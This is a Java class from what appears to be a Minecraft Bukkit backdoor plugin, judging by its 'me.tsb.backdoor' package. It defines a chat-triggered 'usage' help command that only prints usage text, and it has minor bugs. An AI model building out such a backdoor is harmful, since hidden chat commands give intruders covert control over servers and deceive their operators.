package me.tsb.backdoor.commands.help;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(
        displayName = "usage",
        usage = {"<prefix> <command> <command alias>"},
        description = "Tells you how to use the specified command",
        aliases = {"help"})
public class UsageCommand extends Command {
    private Main main;

    public UsageCommand(Main main) {
        super(main);
        this.main = main;
    }

    public void onExec(PlayerChatEvent event, ArrayList<String> args) {
        StringBuilder sb = new StringBuilder();
        sb.append("Usage: \n");

        Command command = this;
        for (String s : command.getUsage()) {
            sb.append(s);
            sb.append("\n");
        }
        sb.delete(sb.length() - 2, sb.length());

        event.getPlayer().sendMessage(sb.toString());
    }
}
